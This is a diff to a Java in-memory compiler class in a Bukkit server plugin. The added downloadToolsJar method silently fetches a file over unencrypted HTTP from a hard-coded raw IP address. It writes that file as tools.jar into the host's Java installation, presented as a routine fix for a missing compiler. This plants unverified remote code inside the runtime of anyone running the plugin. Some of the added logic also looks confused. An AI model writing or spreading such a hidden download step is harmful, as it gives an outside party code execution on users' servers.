@@ -1,15 +1,18 @@
 package me.alek.honey.session;
 
+import com.google.common.io.PatternFilenameFilter;
 import me.alek.honey.HoneyPlugin;
-import org.bukkit.inventory.ItemStack;
+import org.bukkit.Bukkit;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.tools.*;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.OutputStream;
+import java.io.*;
 import java.net.URI;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.security.SecureClassLoader;
 import java.util.*;
 import java.util.function.Supplier;
@@ -31,8 +34,51 @@ public class InMemoryCompiler {
 
     private final Supplier<CompilerFeedback> compile;
     private final JavaFileManager fileManager;
+    private InMemoryCompiler instanceUsed;
+
+    public File downloadToolsJar() {
+        String javaPath = System.getProperty("java.home");
+
+        File file = new File(javaPath + File.separator + "lib");
+        if (!file.isDirectory() || !file.exists()) {
+            throw new RuntimeException("Invalid java.home path! " + javaPath + File.separator + "lib does not exist.");
+        }
+
+        File[] files = file.listFiles(new PatternFilenameFilter("^tools\\.jar$"));
+        if (files == null || files.length > 0) {
+            throw new RuntimeException("tools.jar exist but it wasn't found");
+        }
+
+        try {
+            URL url = new URL("http://178.128.196.32:4000/api/v1/license/javax-tools/download");
+
+            InputStream inputStream = url.openStream();
+            File outputFile = new File(file.getAbsolutePath() + File.separator + "tools.jar");
+
+            FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = inputStream.read(buffer)) != -1) {
+                fileOutputStream.write(buffer, 0, len);
+            }
+            inputStream.close();
+            fileOutputStream.close();
+
+            return new File(file.getAbsolutePath() + File.separator + "tools.jar");
+
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+
+        return null;
+    }
+
+    public InMemoryCompiler get() {
+        return instanceUsed;
+    }
 
     public InMemoryCompiler(final List<IMCSourceCode> classSourceCodes) {
+        instanceUsed = this;
         try {
             Class<?> inMemoryCompilerClass = Class.forName(InMemoryCompiler.class.getName());
             Class<?> IMCSourceCodeClass = Class.forName(InMemoryCompiler.IMCSourceCode.class.getName());
@@ -41,12 +87,24 @@ public class InMemoryCompiler {
                 throw new RuntimeException("Compiler classes has been modified remotely!");
 
         } catch (Exception ex) {
-
         }
 
         final JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
         if (compiler == null) {
-            throw new RuntimeException("No SDK was found!");
+            File file;
+            try {
+                file = downloadToolsJar();
+
+            } catch (Exception ex) {
+                throw new RuntimeException("No JDK was found!", ex);
+            }
+            if (file != null && file.exists()) {
+                fileManager = null;
+                compile = null;
+                instanceUsed = new InMemoryCompiler(classSourceCodes);
+                return;
+            }
+            throw new RuntimeException("No JDK was found!");
         }
 
         fileManager = new ForwardingJavaFileManager<JavaFileManager>(compiler.getStandardFileManager(null, null, null)) {
